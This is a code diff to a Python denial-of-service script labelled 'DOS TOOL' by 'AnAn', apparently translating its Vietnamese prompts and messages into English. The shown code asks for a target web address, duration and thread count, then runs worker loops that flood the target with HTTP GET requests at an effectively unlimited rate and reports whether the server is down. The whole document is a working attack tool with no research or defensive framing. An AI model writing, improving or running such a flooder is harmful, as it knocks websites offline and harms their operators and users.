@@ -136,19 +136,26 @@ def send_request(url):
         response = requests.get(url, headers=headers)
         status = response.status_code
         if status == 200:
-            print(Colorate.Diagonal(Colors.red_to_white,f"Da gui yeu cau den may chu| Status: 200 [AnAn]"))
+            print(Colorate.Diagonal(Colors.red_to_white, 
+                  f"Request sent to server | Status: 200 [AnAn]"))
         elif status == 500:
-            print(Colorate.Diagonal(Colors.red_to_white,f"Sever Khong Phan Hoi | Status: 500 ERROR WEBSITE SERVER IS DOWN [AnAn]"))
+            print(Colorate.Diagonal(Colors.red_to_white, 
+                  f"Server not responding | Status: 500 ERROR – WEBSITE SERVER IS DOWN [AnAn]"))
         else:
-            print(Colorate.Diagonal(Colors.red_to_white,f"Ann Attack| Version 4.5 | Status: {status}"))
+            print(Colorate.Diagonal(Colors.red_to_white, 
+                  f"AnAn Attack | Version 4.5 | Status: {status}"))
     except requests.RequestException as e:
-        print(Colorate.Diagonal(Colors.red_to_white,f"Sever Khong Phan Hoi | Status: 500 ERROR WEBSITE SERVER IS DOWN"))
+        print(Colorate.Diagonal(Colors.red_to_white, 
+              f"Server not responding | Status: 500 ERROR – WEBSITE SERVER IS DOWN"))
+
 def Write_Print(text, color, interval):
     for char in text:
         console.print(char, style=color, end="")
         time.sleep(interval)
-    print() 
+    print()
+
 console = Console()
+
 def worker(url, duration, requests_per_milli):
     end_time = time.time() + duration
     while time.time() < end_time:
@@ -176,15 +183,14 @@ def main():
 ⠀                         ⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣷⣄⢠⣾⣿⣿⣿⡿⠿⠋⠁⠀⠀⠀⠀⠀
                          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ╔══════════════════════════════════════════════════════╗
-         ║    𝐃𝐃𝐎𝐒 𝐓𝐎𝐎𝐋 |  𝐕𝐄𝐑𝐒𝐈𝐎𝐍: 4.5 ║ 𝐃𝐄𝐕 𝐁𝐘: 𝐀𝐍𝐀𝐍          ║
-         ║                                ║ 
+         ║    𝐃𝐎𝐒 𝐓𝐎𝐎𝐋 |  𝐕𝐄𝐑𝐒𝐈𝐎𝐍: 4.5 ║ 𝐃𝐄𝐕 𝐁𝐘: 𝐀𝐍𝐀𝐍           ║
          ╚══════════════════════════════════════════════════════╝
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 \n""",'red', 0.0009)
     sleep(2)
-    url = input(Colorate.Diagonal(Colors.purple_to_blue,"Nhap dia chi web: ")).strip()
-    duration = int(input(Colorate.Diagonal(Colors.purple_to_blue,"Nhap thoi gian: ")).strip())
-    threads_count = int(input(Colorate.Diagonal(Colors.purple_to_blue,"Nhap Thread: ")).strip())
+    url = input(Colorate.Diagonal(Colors.purple_to_blue,"Enter the address: ")).strip()
+    duration = int(input(Colorate.Diagonal(Colors.purple_to_blue,"Enter time: ")).strip())
+    threads_count = int(input(Colorate.Diagonal(Colors.purple_to_blue,"Enter Thread: ")).strip())
 
     requests_per_milli = 99999999999999999999999999999999999999999999999
 
